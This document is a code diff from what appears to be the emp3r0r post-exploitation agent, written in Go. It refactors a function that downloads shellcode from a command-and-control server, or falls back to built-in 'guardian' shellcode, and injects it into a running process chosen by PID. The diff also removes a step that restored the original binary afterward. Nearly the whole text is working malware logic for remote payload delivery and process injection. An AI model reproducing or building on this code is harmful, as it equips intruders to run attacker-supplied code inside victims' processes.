@@ -141,27 +141,28 @@ func prepare_shared_lib() (path string, err error) {
 	return
 }
 
+// prepare the shellcode
+func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
+	sc, err := DownloadViaCC("shellcode.txt", "")
+
+	if err != nil {
+		log.Printf("Failed to download shellcode.txt from CC: %v", err)
+		// prepare guardian_shellcode
+		emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
+		if err != nil {
+			log.Printf("Failed to prepare_guardian_sc: %v", err)
+			return
+		}
+		sc = []byte(emp3r0r_data.GuardianShellcode)
+	}
+	shellcode = string(sc)
+	shellcodeLen = strings.Count(string(shellcode), "0x")
+	log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
+	return
+}
+
 // InjectorHandler handles `injector` module
 func InjectorHandler(pid int, method string) (err error) {
-	// prepare the shellcode
-	prepare_sc := func() (shellcode string, shellcodeLen int) {
-		sc, err := DownloadViaCC("shellcode.txt", "")
-
-		if err != nil {
-			log.Printf("Failed to download shellcode.txt from CC: %v", err)
-			// prepare guardian_shellcode
-			emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
-			if err != nil {
-				log.Printf("Failed to prepare_guardian_sc: %v", err)
-				return
-			}
-			sc = []byte(emp3r0r_data.GuardianShellcode)
-		}
-		shellcode = string(sc)
-		shellcodeLen = strings.Count(string(shellcode), "0x")
-		log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
-		return
-	}
 
 	// dispatch
 	switch method {
@@ -176,14 +177,11 @@ func InjectorHandler(pid int, method string) (err error) {
 		err = gdbInjectSharedLibWorker(so_path, pid)
 
 	case "inject_shellcode":
-		shellcode, _ := prepare_sc()
+		shellcode, _ := prepare_sc(pid)
 		err = ShellcodeInjector(&shellcode, pid)
 		if err != nil {
 			return
 		}
-
-		// restore original binary
-		err = CopyProcExeTo(pid, util.ProcExePath(pid)) // as long as the process is still running
 
 	case "inject_loader":
 		err = InjectLoader(pid)
